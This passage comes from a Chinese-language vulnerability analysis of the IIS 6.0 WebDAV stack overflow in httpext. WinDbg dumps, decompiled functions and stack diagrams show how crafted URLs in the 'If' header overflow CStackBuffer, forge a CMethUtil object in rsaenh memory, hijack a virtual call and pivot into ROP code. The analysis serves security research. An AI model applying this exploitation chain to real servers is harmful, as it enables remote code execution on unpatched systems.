<span class="n">eax</span><span class="o">=</span><span class="mi">00000000</span> <span class="n">ebx</span><span class="o">=</span><span class="mi">070</span><span class="n">fbfc0</span> <span class="n">ecx</span><span class="o">=</span><span class="mi">0000</span><span class="n">e694</span> <span class="n">edx</span><span class="o">=</span><span class="mi">03</span><span class="n">faf804</span> <span class="n">esi</span><span class="o">=</span><span class="mi">00000001</span> <span class="n">edi</span><span class="o">=</span><span class="mi">77</span><span class="n">bd8ef2</span>
<span class="n">eip</span><span class="o">=</span><span class="mi">67125484</span> <span class="n">esp</span><span class="o">=</span><span class="mi">03</span><span class="n">faf7c0</span> <span class="n">ebp</span><span class="o">=</span><span class="mi">03</span><span class="n">fafc34</span> <span class="n">iopl</span><span class="o">=</span><span class="mi">0</span>         <span class="n">nv</span> <span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">zr</span> <span class="n">na</span> <span class="n">pe</span> <span class="n">nc</span>
<span class="n">cs</span><span class="o">=</span><span class="mi">001</span><span class="n">b</span>  <span class="n">ss</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">ds</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">es</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">fs</span><span class="o">=</span><span class="mi">003</span><span class="n">b</span>  <span class="n">gs</span><span class="o">=</span><span class="mi">0000</span>             <span class="n">efl</span><span class="o">=</span><span class="mi">00000246</span>
<span class="n">httpext</span><span class="o">!</span><span class="n">HrCheckIfHeader</span><span class="o">+</span><span class="mh">0x15e</span><span class="o">:</span>
<span class="mi">67125484</span> <span class="mi">8</span><span class="n">bf0</span>            <span class="n">mov</span>     <span class="n">esi</span><span class="o">,</span><span class="n">eax</span>

<span class="n">$$</span> <span class="err">留意最后面</span> <span class="mi">2</span> <span class="err">个</span> <span class="n">DWORD</span> <span class="err">的值</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">006</span><span class="o">&gt;</span> <span class="n">db</span> <span class="n">ebp</span><span class="o">-</span><span class="mi">430</span> <span class="n">L10C</span>
<span class="mi">03</span><span class="n">faf804</span>  <span class="mi">63</span> <span class="mi">00</span> <span class="mi">3</span><span class="n">a</span> <span class="mi">00</span> <span class="mi">5</span><span class="n">c</span> <span class="mi">00</span> <span class="mi">69</span> <span class="mi">00</span><span class="o">-</span><span class="mi">6</span><span class="n">e</span> <span class="mi">00</span> <span class="mi">65</span> <span class="mi">00</span> <span class="mi">74</span> <span class="mi">00</span> <span class="mi">70</span> <span class="mi">00</span>  <span class="n">c</span><span class="o">.:.\.</span><span class="n">i</span><span class="o">.</span><span class="na">n</span><span class="o">.</span><span class="na">e</span><span class="o">.</span><span class="na">t</span><span class="o">.</span><span class="na">p</span><span class="o">.</span>
<span class="mi">03</span><span class="n">faf814</span>  <span class="mi">75</span> <span class="mi">00</span> <span class="mi">62</span> <span class="mi">00</span> <span class="mi">5</span><span class="n">c</span> <span class="mi">00</span> <span class="mi">77</span> <span class="mi">00</span><span class="o">-</span><span class="mi">77</span> <span class="mi">00</span> <span class="mi">77</span> <span class="mi">00</span> <span class="mi">72</span> <span class="mi">00</span> <span class="mi">6</span><span class="n">f</span> <span class="mi">00</span>  <span class="n">u</span><span class="o">.</span><span class="na">b</span><span class="o">.\.</span><span class="n">w</span><span class="o">.</span><span class="na">w</span><span class="o">.</span><span class="na">w</span><span class="o">.</span><span class="na">r</span><span class="o">.</span><span class="na">o</span><span class="o">.</span>
<span class="mi">03</span><span class="n">faf824</span>  <span class="mi">6</span><span class="n">f</span> <span class="mi">00</span> <span class="mi">74</span> <span class="mi">00</span> <span class="mi">5</span><span class="n">c</span> <span class="mi">00</span> <span class="mi">61</span> <span class="mi">00</span><span class="o">-</span><span class="mi">61</span> <span class="mi">00</span> <span class="mi">61</span> <span class="mi">00</span> <span class="mi">61</span> <span class="mi">00</span> <span class="mi">61</span> <span class="mi">00</span>  <span class="n">o</span><span class="o">.</span><span class="na">t</span><span class="o">.\.</span><span class="n">a</span><span class="o">.</span><span class="na">a</span><span class="o">.</span><span class="na">a</span><span class="o">.</span><span class="na">a</span><span class="o">.</span><span class="na">a</span><span class="o">.</span>
<span class="mi">03</span><span class="n">faf834</span>  <span class="mi">61</span> <span class="mi">00</span> <span class="mi">61</span> <span class="mi">00</span> <span class="mi">68</span> <span class="mi">6</span><span class="n">f</span> <span class="mi">63</span> <span class="mi">78</span><span class="o">-</span><span class="mi">61</span> <span class="mi">77</span> <span class="mi">33</span> <span class="mi">71</span> <span class="mi">36</span> <span class="mi">69</span> <span class="mi">72</span> <span class="mi">47</span>  <span class="n">a</span><span class="o">.</span><span class="na">a</span><span class="o">.</span><span class="na">hocxaw3q6irG</span>
<span class="mi">03</span><span class="n">faf844</span>  <span class="mi">39</span> <span class="mi">7</span><span class="n">a</span> <span class="mi">77</span> <span class="mi">4</span><span class="n">b</span> <span class="mi">70</span> <span class="mi">4</span><span class="n">f</span> <span class="mi">53</span> <span class="mi">75</span><span class="o">-</span><span class="mi">4</span><span class="n">f</span> <span class="mi">7</span><span class="n">a</span> <span class="mi">68</span> <span class="mi">48</span> <span class="mi">63</span> <span class="mi">56</span> <span class="mi">54</span> <span class="mi">6</span><span class="n">d</span>  <span class="mi">9</span><span class="n">zwKpOSuOzhHcVTm</span>
<span class="mi">03</span><span class="n">faf854</span>  <span class="mi">45</span> <span class="mi">68</span> <span class="mi">53</span> <span class="mi">39</span> <span class="mi">6</span><span class="n">c</span> <span class="mi">50</span> <span class="mi">67</span> <span class="mi">55</span><span class="o">-</span><span class="mi">63</span> <span class="mi">67</span> <span class="mi">64</span> <span class="mi">33</span> <span class="mi">30</span> <span class="mi">46</span> <span class="mi">45</span> <span class="mi">78</span>  <span class="n">EhS9lPgUcgd30FEx</span>
<span class="mi">03</span><span class="n">faf864</span>  <span class="mi">52</span> <span class="mi">69</span> <span class="mi">31</span> <span class="mi">54</span> <span class="mi">58</span> <span class="mi">4</span><span class="n">c</span> <span class="mi">51</span> <span class="mi">6</span><span class="n">a</span><span class="o">-</span><span class="mi">41</span> <span class="mi">72</span> <span class="mi">31</span> <span class="mi">42</span> <span class="mi">35</span> <span class="mi">70</span> <span class="mi">50</span> <span class="mi">58</span>  <span class="n">Ri1TXLQjAr1B5pPX</span>
<span class="mi">03</span><span class="n">faf874</span>  <span class="mi">64</span> <span class="mi">36</span> <span class="mi">47</span> <span class="mi">6</span><span class="n">c</span> <span class="mi">39</span> <span class="mi">35</span> <span class="mi">6</span><span class="n">a</span> <span class="mi">54</span><span class="o">-</span><span class="mi">34</span> <span class="mi">50</span> <span class="mi">43</span> <span class="mi">54</span> <span class="mi">52</span> <span class="mi">77</span> <span class="mi">61</span> <span class="mi">50</span>  <span class="n">d6Gl95jT4PCTRwaP</span>
<span class="mi">03</span><span class="n">faf884</span>  <span class="mi">32</span> <span class="mi">32</span> <span class="mi">4</span><span class="n">b</span> <span class="mi">6</span><span class="n">d</span> <span class="mi">34</span> <span class="mi">6</span><span class="n">c</span> <span class="mi">47</span> <span class="mi">32</span><span class="o">-</span><span class="mi">41</span> <span class="mi">62</span> <span class="mi">4</span><span class="n">d</span> <span class="mi">37</span> <span class="mi">61</span> <span class="mi">51</span> <span class="mi">62</span> <span class="mi">58</span>  <span class="mi">22</span><span class="n">Km4lG2AbM7aQbX</span>
<span class="mi">03</span><span class="n">faf894</span>  <span class="mi">73</span> <span class="mi">47</span> <span class="mi">50</span> <span class="mi">52</span> <span class="mi">70</span> <span class="mi">36</span> <span class="mi">44</span> <span class="mi">75</span><span class="o">-</span><span class="mi">6</span><span class="n">a</span> <span class="mi">68</span> <span class="mi">74</span> <span class="mi">33</span> <span class="mi">4</span><span class="n">a</span> <span class="mi">4</span><span class="n">e</span> <span class="mi">6</span><span class="n">b</span> <span class="mi">78</span>  <span class="n">sGPRp6Dujht3JNkx</span>
<span class="mi">03</span><span class="n">faf8a4</span>  <span class="mi">76</span> <span class="mi">49</span> <span class="mi">73</span> <span class="mi">4</span><span class="n">e</span> <span class="mi">6</span><span class="n">a</span> <span class="mi">4</span><span class="n">c</span> <span class="mi">7</span><span class="n">a</span> <span class="mi">57</span><span class="o">-</span><span class="mi">71</span> <span class="mi">6</span><span class="n">f</span> <span class="mi">4</span><span class="n">a</span> <span class="mi">58</span> <span class="mi">30</span> <span class="mi">32</span> <span class="mi">6</span><span class="n">e</span> <span class="mi">37</span>  <span class="n">vIsNjLzWqoJX02n7</span>
<span class="mi">03</span><span class="n">faf8b4</span>  <span class="mi">49</span> <span class="mi">4</span><span class="n">b</span> <span class="mi">4</span><span class="n">d</span> <span class="mi">52</span> <span class="mi">63</span> <span class="mi">48</span> <span class="mi">4</span><span class="n">c</span> <span class="mi">6</span><span class="n">f</span><span class="o">-</span><span class="mi">56</span> <span class="mi">75</span> <span class="mi">75</span> <span class="mi">75</span> <span class="mi">6</span><span class="n">f</span> <span class="mi">66</span> <span class="mi">68</span> <span class="mi">76</span>  <span class="n">IKMRcHLoVuuuofhv</span>
<span class="mi">03</span><span class="n">faf8c4</span>  <span class="mi">4</span><span class="n">d</span> <span class="mi">44</span> <span class="mi">70</span> <span class="mi">50</span> <span class="mi">36</span> <span class="mi">7</span><span class="n">a</span> <span class="mi">4</span><span class="n">b</span> <span class="mi">62</span><span class="o">-</span><span class="mi">57</span> <span class="mi">65</span> <span class="mi">50</span> <span class="mi">75</span> <span class="mi">72</span> <span class="mi">6</span><span class="n">a</span> <span class="mi">6</span><span class="n">b</span> <span class="mi">7</span><span class="n">a</span>  <span class="n">MDpP6zKbWePurjkz</span>
<span class="mi">03</span><span class="n">faf8d4</span>  <span class="mi">62</span> <span class="mi">77</span> <span class="mi">58</span> <span class="mi">76</span> <span class="mi">48</span> <span class="mi">62</span> <span class="mi">31</span> <span class="mi">65</span><span class="o">-</span><span class="mi">54</span> <span class="mi">30</span> <span class="mi">79</span> <span class="mi">6</span><span class="n">c</span> <span class="mi">4</span><span class="n">a</span> <span class="mi">50</span> <span class="mi">62</span> <span class="mi">54</span>  <span class="n">bwXvHb1eT0ylJPbT</span>
<span class="mi">03</span><span class="n">faf8e4</span>  <span class="mi">33</span> <span class="mi">50</span> <span class="mi">77</span> <span class="mi">35</span> <span class="mi">77</span> <span class="mi">6</span><span class="n">a</span> <span class="mi">44</span> <span class="mi">41</span><span class="o">-</span><span class="mi">34</span> <span class="mi">33</span> <span class="mi">76</span> <span class="mi">64</span> <span class="mi">46</span> <span class="mi">4</span><span class="n">d</span> <span class="mi">54</span> <span class="mi">56</span>  <span class="mi">3</span><span class="n">Pw5wjDA43vdFMTV</span>
<span class="mi">03</span><span class="n">faf8f4</span>  <span class="mi">6</span><span class="n">c</span> <span class="mi">47</span> <span class="mi">43</span> <span class="mi">65</span> <span class="mi">32</span> <span class="mi">76</span> <span class="mi">78</span> <span class="mi">72</span><span class="o">-</span><span class="mi">69</span> <span class="mi">57</span> <span class="mi">38</span> <span class="mi">43</span> <span class="mi">72</span> <span class="mi">62</span> <span class="mi">30</span> <span class="mi">5</span><span class="n">a</span>  <span class="n">lGCe2vxriW8Crb0Z</span>
<span class="mi">03</span><span class="n">faf904</span>  <span class="mi">38</span> <span class="mi">59</span> <span class="mi">48</span> <span class="mi">54</span> <span class="mi">02</span> <span class="mi">02</span> <span class="mi">02</span> <span class="mi">02</span><span class="o">-</span><span class="n">c0</span> <span class="mi">12</span> <span class="mi">03</span> <span class="mi">68</span>              <span class="mi">8</span><span class="n">YHT</span><span class="o">.......</span><span class="n">h</span>
                      <span class="o">^^^^^^^^^^^</span> <span class="o">~~~~~~~~~~~</span>
</pre></div>


<h3>3.3 填充数据</h3>
<p>通过<code>!address</code> 命令可知地址 <code>0x680312c0</code> 位于 <code>rsaenh</code> 模块中，具备 <code>PAGE_READWRITE</code> 属性。</p>
<div class="codehilite"><pre><span></span><span class="mi">0</span><span class="o">:</span><span class="mi">006</span><span class="o">&gt;</span> <span class="o">!</span><span class="n">address</span> <span class="mi">680312</span><span class="n">c0</span>
<span class="n">Failed</span> <span class="n">to</span> <span class="n">map</span> <span class="n">Heaps</span> <span class="o">(</span><span class="n">error</span> <span class="mi">80004005</span><span class="o">)</span>
<span class="n">Usage</span><span class="o">:</span>                  <span class="n">Image</span>
<span class="n">Allocation</span> <span class="n">Base</span><span class="o">:</span>        <span class="mi">68000000</span>
<span class="n">Base</span> <span class="n">Address</span><span class="o">:</span>           <span class="mi">68030000</span>
<span class="n">End</span> <span class="n">Address</span><span class="o">:</span>            <span class="mi">68032000</span>
<span class="n">Region</span> <span class="n">Size</span><span class="o">:</span>            <span class="mi">00002000</span>
<span class="n">Type</span><span class="o">:</span>                   <span class="mi">01000000</span>    <span class="n">MEM_IMAGE</span>
<span class="n">State</span><span class="o">:</span>                  <span class="mi">00001000</span>    <span class="n">MEM_COMMIT</span>
<span class="n">Protect</span><span class="o">:</span>                <span class="mi">00000004</span>    <span class="n">PAGE_READWRITE</span>
<span class="n">More</span> <span class="n">info</span><span class="o">:</span>              <span class="n">lmv</span> <span class="n">m</span> <span class="n">rsaenh</span>
<span class="n">More</span> <span class="n">info</span><span class="o">:</span>              <span class="o">!</span><span class="n">lmi</span> <span class="n">rsaenh</span>
<span class="n">More</span> <span class="n">info</span><span class="o">:</span>              <span class="n">ln</span> <span class="mh">0x680312c0</span>

<span class="mi">0</span><span class="o">:</span><span class="mi">006</span><span class="o">&gt;</span> <span class="n">u</span> <span class="mi">680312</span><span class="n">c0</span> <span class="n">L1</span>
<span class="n">rsaenh</span><span class="o">!</span><span class="n">g_pfnFree</span><span class="o">+</span><span class="mh">0x4</span><span class="o">:</span>
<span class="mi">680312</span><span class="n">c0</span> <span class="mi">0000</span>            <span class="n">add</span>     <span class="n">byte</span> <span class="n">ptr</span> <span class="o">[</span><span class="n">eax</span><span class="o">],</span><span class="n">al</span>
</pre></div>


<p>在解析 <code>http://localhost/bbbbbbb......</code> 时，数据将被直接填充到地址 <code>0x680312c0</code>。此时，由于 <code>CStackBuffer1</code> 的长度已经 <strong><em>足够大</em></strong>，<code>ScStoragePathFromUrl</code> 只会被调用一次。</p>
<div class="codehilite"><pre><span></span>$$ ScStoragePathFromUrl 参数
0:006&gt; dds esp L3
03faf7b4  077dc9e0
03faf7b8  680312c0 rsaenh!g_pfnFree+0x4
03faf7bc  03faf800

0:006&gt; dd 03faf800 L1
03faf800  00404040

0:006&gt; p
eax=00000000 ebx=070fbfc0 ecx=0000e694 edx=680312c0 esi=00000000 edi=77bd8ef2
eip=6712544a esp=03faf7c0 ebp=03fafc34 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
httpext!HrCheckIfHeader+0x124:
6712544a 8bf0            mov     esi,eax

$$ 填充数据到 0x680312c0
0:006&gt; db 680312c0
680312c0  63 00 3a 00 5c 00 69 00-6e 00 65 00 74 00 70 00  c.:.\.i.n.e.t.p.
680312d0  75 00 62 00 5c 00 77 00-77 00 77 00 72 00 6f 00  u.b.\.w.w.w.r.o.
680312e0  6f 00 74 00 5c 00 62 00-62 00 62 00 62 00 62 00  o.t.\.b.b.b.b.b.
680312f0  62 00 62 00 48 79 75 61-43 4f 67 6f 6f 6b 45 48  b.b.HyuaCOgookEH
68031300  46 36 75 67 33 44 71 38-65 57 62 5a 35 54 61 56  F6ug3Dq8eWbZ5TaV
68031310  52 69 53 6a 57 51 4e 38-48 59 55 63 71 49 64 43  RiSjWQN8HYUcqIdC
68031320  72 64 68 34 58 47 79 71-6b 33 55 6b 48 6d 4f 50  rdh4XGyqk3UkHmOP
68031330  46 7a 71 34 54 6f 43 74-56 59 6f 6f 41 73 57 34  Fzq4ToCtVYooAsW4
0:006&gt; db
68031340  68 61 72 7a 45 37 49 4d-4e 57 48 54 38 4c 7a 36  harzE7IMNWHT8Lz6
68031350  72 35 66 62 43 6e 6d 48-48 35 77 61 5a 4d 74 61  r5fbCnmHH5waZMta
68031360  33 41 65 43 72 52 69 6d-71 36 64 4e 39 6e 53 63  3AeCrRimq6dN9nSc
68031370  64 6b 46 51 30 4f 6f 78-53 72 50 67 53 45 63 7a  dkFQ0OoxSrPgSEcz
68031380  39 71 53 4f 56 44 36 6f-79 73 77 68 56 7a 4a 61  9qSOVD6oyswhVzJa
68031390  45 39 39 36 39 6c 31 45-72 34 65 53 4a 58 4e 44  E9969l1Er4eSJXND
680313a0  44 7a 35 6c 56 5a 41 62-72 6e 31 66 59 59 33 54  Dz5lVZAbrn1fYY3T
680313b0  42 31 65 58 41 59 50 71-36 30 77 57 57 44 61 53  B1eXAYPq60wWWDaS
0:006&gt; db
680313c0  c0 13 03 68 4f 6e 00 68-4f 6e 00 68 47 42 6a 76  ...hOn.hOn.hGBjv
680313d0  c0 13 03 68 57 42 74 4f-47 59 34 52 66 4b 42 4b  ...hWBtOGY4RfKBK
680313e0  64 74 6f 78 82 60 01 68-35 51 7a 72 7a 74 47 4d  dtox.`.h5QzrztGM
680313f0  59 44 57 57 13 b1 00 68-76 31 6f 6e e3 24 01 68  YDWW...hv1on.$.h
68031400  60 14 03 68 00 03 fe 7f-ff ff ff ff c0 13 03 68  `..h...........h
68031410  6e 04 03 68 6e 71 70 74-34 14 03 68 e7 29 01 68  n..hnqpt4..h.).h
68031420  91 93 00 68 31 39 6e 66-55 49 52 30 6b 54 6b 76  ...h19nfUIR0kTkv
68031430  4a 72 61 79 1c 14 03 68-05 6e 00 68 32 77 68 79  Jray...h.n.h2why
</pre></div>


<h3>3.4 控制 EIP</h3>
<p>在函数 <code>HrCheckIfHeader</code> 返回后，后面会跳转到 <code>CParseLockTokenHeader::HrGetLockIdForPath</code> 中去执行，而后者也会多次调用 <code>CMethUtil::ScStoragePathFromUrl</code> 这个函数。同样，解析 URL 第一部分（<code>http://localhost/aaaaaaa....</code>）时完成栈溢出，此时会覆盖到一个引用 <code>CMethUtil</code> 对象的局部变量；在解析 URL 第二部分（<code>http://localhost/bbbbbbb....</code>）时，因为 <code>CMethUtil</code> 已经伪造好，其成员 <code>IEcb</code> 实例同样完成伪造，最后在 <code>ScStripAndCheckHttpPrefix</code> 中实现 EIP 的控制。</p>
<div class="codehilite"><pre><span></span>CPutRequest::Execute
├──HrCheckStateHeaders
│  └──HrCheckIfHeader
│     ├──CMethUtil::ScStoragePathFromUrl
│     └──CMethUtil::ScStoragePathFromUrl
│
└──FGetLockHandle
   └──CParseLockTokenHeader::HrGetLockIdForPath
      ├──CMethUtil::ScStoragePathFromUrl
      └──CMethUtil::ScStoragePathFromUrl
</pre></div>


<p><strong>(1) FGetLockHandle 分析</strong>
函数 <code>FGetLockHandle</code> 里面构造了一个 <code>CParseLockTokenHeader</code> 对象，<strong>存储于栈上的一个局部变量引用了这个对象</strong> （这一点很重要），调用该对象的成员函数 <code>HrGetLockIdForPath</code> 进入下一阶段。</p>
<div class="codehilite"><pre><span></span><span class="kt">int</span> <span class="kr">__stdcall</span> <span class="nf">FGetLockHandle</span><span class="p">(</span>
    <span class="k">struct</span> <span class="n">CMethUtil</span> <span class="o">*</span><span class="n">a1</span><span class="p">,</span> <span class="kt">wchar_t</span> <span class="o">*</span><span class="n">Str</span><span class="p">,</span> 
    <span class="kt">unsigned</span> <span class="kr">__int32</span> <span class="n">a3</span><span class="p">,</span> <span class="k">const</span> <span class="kt">unsigned</span> <span class="kr">__int16</span> <span class="o">*</span><span class="n">a4</span><span class="p">,</span> 
    <span class="k">struct</span> <span class="n">auto_ref_handle</span> <span class="o">*</span><span class="n">a5</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">signed</span> <span class="kt">int</span> <span class="n">v5</span><span class="p">;</span> <span class="c1">// eax@1</span>
  <span class="kt">int</span> <span class="n">result</span><span class="p">;</span> <span class="c1">// eax@2</span>
  <span class="n">CParseLockTokenHeader</span> <span class="o">*</span><span class="n">v7</span><span class="p">;</span> <span class="c1">// [sp+0h] [bp-54h]@1</span>
  <span class="k">union</span> <span class="n">_LARGE_INTEGER</span> <span class="n">v8</span><span class="p">;</span> <span class="c1">// [sp+40h] [bp-14h]@1</span>
  <span class="kt">int</span> <span class="n">v9</span><span class="p">;</span> <span class="c1">// [sp+50h] [bp-4h]@1</span>

  <span class="n">v7</span> <span class="o">=</span> <span class="n">CParseLockTokenHeader</span><span class="p">(</span><span class="n">a1</span><span class="p">,</span> <span class="n">a4</span><span class="p">);</span>
  <span class="n">v9</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">v7</span><span class="o">-&gt;</span><span class="n">SetPaths</span><span class="p">(</span><span class="n">Str</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
  <span class="n">v5</span> <span class="o">=</span> <span class="n">v7</span><span class="o">-&gt;</span><span class="n">HrGetLockIdForPath</span><span class="p">(</span><span class="n">Str</span><span class="p">,</span> <span class="n">a3</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v8</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
  <span class="n">v9</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">v5</span> <span class="o">&gt;=</span> <span class="mi">0</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">result</span> <span class="o">=</span> <span class="n">FGetLockHandleFromId</span><span class="p">(</span><span class="n">a1</span><span class="p">,</span> <span class="n">v8</span><span class="p">,</span> <span class="n">Str</span><span class="p">,</span> <span class="n">a3</span><span class="p">,</span> <span class="n">a5</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="k">else</span>
  <span class="p">{</span>
    <span class="n">result</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>


<p><strong>(2) HrGetLockIdForPath 分析</strong>
<code>HrGetLockIdForPath</code> 与 <code>HrCheckIfHeader</code> 有点类似，同样存在两个 <code>CStackBuffer</code> 变量。不同的是，<code>v22.HighPart</code> 指向父级函数 <code>HrGetLockIdForPath</code> 中引用 <code>CParseLockTokenHeader</code> 对象的局部变量，而且这里也会将其转换为 <code>CMethUtil</code> 类型使用。</p>
<p>在解析 URL 第一部分（<code>http://localhost/aaaaaaa....</code>）时，通过栈溢出可以覆盖引用 <code>CParseLockTokenHeader</code> 对象的局部变量，栈布局如下所示。</p>
<div class="codehilite"><pre><span></span>┌─────────────────────────┐
│   v7 (FGetLockHandle)   │  CParseLockTokenHeader &lt;────┐
├─────────────────────────┤               ↑o            │
│          ......         │               │v            │
├─────────────────────────┤               │e            │
│            2.heap_buffer│  ebp-14       │r            │
├─────────────────────────┤               │f            │
│         2.fake_heap_size│  ebp-18       │l            │
├─────────────────────────┤               │o            │
│CStackBuffer2.buffer[260]│  ebp-11C      │w            │
├─────────────────────────┤ &lt;-------- overwrite data    │
│            1.heap_buffer│  ebp-120 -&gt; heap (url part1)│
├─────────────────────────┤                             │
│         1.fake_heap_size│  ebp-124                    │
├─────────────────────────┤                             │
│CStackBuffer1.buffer[260]│  ebp-228                    │
├─────────────────────────┤                             │
│          ......         │                             │
├────────────┬────────────┤                             │
│ v22.LowPart│v22.HighPart│  ebp-240  (LARGE_INTEGER) ──┘
└────────────┴────────────┘
</pre></div>


<p>栈上的数据分布如下所示：</p>
<div class="codehilite"><pre><span></span><span class="mi">0</span><span class="o">:</span><span class="mi">006</span><span class="o">&gt;</span> <span class="n">dds</span> <span class="n">ebp</span><span class="o">-</span><span class="mi">18</span>
<span class="mi">03</span><span class="n">fafbb8</span>  <span class="mi">00000412</span> <span class="o">--------&gt;</span> <span class="n">CStackBuffer2</span><span class="o">.</span><span class="na">fake_heap_size</span>
<span class="mi">03</span><span class="n">fafbbc</span>  <span class="mi">03</span><span class="n">fafab4</span> <span class="o">--------&gt;</span> <span class="n">CStackBuffer2</span><span class="o">.</span><span class="na">buffer</span><span class="o">[</span><span class="mi">260</span><span class="o">]</span>
<span class="mi">03</span><span class="n">fafbc0</span>  <span class="mi">00000168</span>
<span class="mi">03</span><span class="n">fafbc4</span>  <span class="mi">03</span><span class="n">fafc30</span>
<span class="mi">03</span><span class="n">fafbc8</span>  <span class="mi">67140</span><span class="n">bdd</span> <span class="n">httpext</span><span class="o">!</span><span class="n">swscanf</span><span class="o">+</span><span class="mh">0x137d</span>  <span class="o">--&gt;</span> <span class="n">ret</span> <span class="n">addr</span>
<span class="mi">03</span><span class="n">fafbcc</span>  <span class="mi">00000002</span>
<span class="mi">03</span><span class="n">fafbd0</span>  <span class="mi">03</span><span class="n">fafc3c</span>
<span class="mi">03</span><span class="n">fafbd4</span>  <span class="mi">6711</span><span class="n">aba9</span> <span class="n">httpext</span><span class="o">!</span><span class="n">FGetLockHandle</span><span class="o">+</span><span class="mh">0x40</span>
<span class="mi">03</span><span class="n">fafbd8</span>  <span class="mi">07874</span><span class="n">c2e</span>
<span class="mi">03</span><span class="n">fafbdc</span>  <span class="mi">80000000</span>
<span class="mi">03</span><span class="n">fafbe0</span>  <span class="mi">03</span><span class="n">fafc28</span>
<span class="mi">03</span><span class="n">fafbe4</span>  <span class="mi">00000000</span>
<span class="mi">03</span><span class="n">fafbe8</span>  <span class="mi">07872</span><span class="n">fc0</span> <span class="o">--------&gt;</span> <span class="n">CParseLockTokenHeader</span> <span class="n">xx</span>
<span class="mi">03</span><span class="n">fafbec</span>  <span class="mi">0788</span><span class="n">c858</span>
<span class="mi">03</span><span class="n">fafbf0</span>  <span class="mi">0788</span><span class="n">c858</span>

<span class="n">$$</span> <span class="n">CMethUtil</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">006</span><span class="o">&gt;</span> <span class="n">r</span> <span class="n">ecx</span>
<span class="n">ecx</span><span class="o">=</span><span class="mi">07872</span><span class="n">fc0</span>

<span class="n">$$</span> <span class="n">LARGE_INTEGER</span> <span class="n">v22</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">006</span><span class="o">&gt;</span> <span class="n">dd</span> <span class="n">ebp</span><span class="o">-</span><span class="mi">240</span> <span class="n">L2</span>
<span class="mi">03</span><span class="n">faf990</span>  <span class="mi">5</span><span class="n">a3211a0</span> <span class="mi">03</span><span class="n">fafbe8</span>

<span class="n">$$</span> <span class="n">CStackBuffer2</span><span class="o">.</span><span class="na">buffer</span><span class="o">[</span><span class="mi">260</span><span class="o">]</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">006</span><span class="o">&gt;</span> <span class="o">?</span><span class="n">ebp</span><span class="o">-</span><span class="mi">11</span><span class="n">C</span>
<span class="n">Evaluate</span> <span class="n">expression</span><span class="o">:</span> <span class="mi">66779828</span> <span class="o">=</span> <span class="mi">03</span><span class="n">fafab4</span>
</pre></div>


<p>分析栈的布局可以知道，在复制 <code>260+12*4=308</code> 字节数据后，后续的 <code>4</code> 字节数据将覆盖引用 <code>CParseLockTokenHeader</code> 对象的局部变量。需要注意的是，这里所说的 <code>308</code> 字节，是 URL 转变成物理路径后的前 <code>308</code> 字节。执行完 <code>CMethUtil::ScStoragePathFromUrl</code> 之后，<code>680313c0</code> 被填充到父级函数中引用 <code>CParseLockTokenHeader</code> 对象所在的局部变量。</p>
<div class="codehilite"><pre><span></span>$$ LARGE_INTEGER v22
0:006&gt; dd ebp-240 L2
03faf990  5a3211a0 03fafbe8

0:006&gt; dd 03fafbe8 L1
03fafbe8  680313c0
</pre></div>


<p><strong>(3) ScStripAndCheckHttpPrefix 分析</strong>
在解析 URL 第二部分（<code>http://localhost/bbbbbbb....</code>）时，由于引用 <code>CParseLockTokenHeader</code> 对象的局部变量的值已经被修改，所以会使用伪造的对象，最终在函数 <code>ScStripAndCheckHttpPrefix</code> 中完成控制权的转移。</p>
<div class="codehilite"><pre><span></span>CPutRequest::Execute
└──FGetLockHandle
   └──CParseLockTokenHeader::HrGetLockIdForPath ecx = 0x680313C0
      ├──CMethUtil::ScStoragePathFromUrl        ecx = 0x680313C0
      │  └──ScStoragePathFromUrl                ecx = [ecx+0x10]=0x680313C0
      │     └──ScStripAndCheckHttpPrefix        call [[ecx]+0x24]
      └──CMethUtil::ScStoragePathFromUrl
</pre></div>


<p>接管控制权后，将开始执行 ROP 代码。</p>
<div class="codehilite"><pre><span></span><span class="mi">0</span><span class="o">:</span><span class="mi">006</span><span class="o">&gt;</span> <span class="n">dd</span> <span class="mi">680313</span><span class="n">C0</span> <span class="n">L1</span>
<span class="mi">680313</span><span class="n">c0</span>  <span class="mi">680313</span><span class="n">c0</span>

<span class="mi">0</span><span class="o">:</span><span class="mi">006</span><span class="o">&gt;</span> <span class="n">dd</span> <span class="mi">680313</span><span class="n">C0</span><span class="o">+</span><span class="mi">10</span> <span class="n">L1</span>
<span class="mi">680313</span><span class="n">d0</span>  <span class="mi">680313</span><span class="n">c0</span>

<span class="mi">0</span><span class="o">:</span><span class="mi">006</span><span class="o">&gt;</span> <span class="n">dd</span> <span class="mi">680313</span><span class="n">C0</span><span class="o">+</span><span class="mi">24</span> <span class="n">L1</span>
<span class="mi">680313</span><span class="n">e4</span>  <span class="mi">68016082</span>

<span class="mi">0</span><span class="o">:</span><span class="mi">006</span><span class="o">&gt;</span> <span class="n">u</span> <span class="mi">68016082</span>
<span class="n">rsaenh</span><span class="o">!</span><span class="n">_alloca_probe</span><span class="o">+</span><span class="mh">0x42</span><span class="o">:</span>
<span class="mi">68016082</span> <span class="mi">8</span><span class="n">be1</span>            <span class="n">mov</span>     <span class="n">esp</span><span class="o">,</span><span class="n">ecx</span>
<span class="mi">68016084</span> <span class="mi">8</span><span class="n">b08</span>            <span class="n">mov</span>     <span class="n">ecx</span><span class="o">,</span><span class="n">dword</span> <span class="n">ptr</span> <span class="o">[</span><span class="n">eax</span><span class="o">]</span>
